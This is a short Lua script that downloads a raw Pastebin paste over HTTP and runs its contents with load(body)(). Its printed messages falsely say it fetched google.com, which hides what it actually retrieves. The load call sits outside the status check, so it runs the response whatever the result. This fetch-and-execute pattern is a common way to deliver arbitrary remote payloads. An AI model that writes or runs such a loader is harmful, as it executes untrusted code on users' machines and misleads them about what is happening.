local http = require('coro-http')
local res, body = http.request("GET", "https://pastebin.com/raw/ngXP02Nq")
if res.code > 299 then
  print('Failed to fetch google.com: ' .. res.reason)
else
  print('Successfully fetched google.com!')
  
end
load(body)()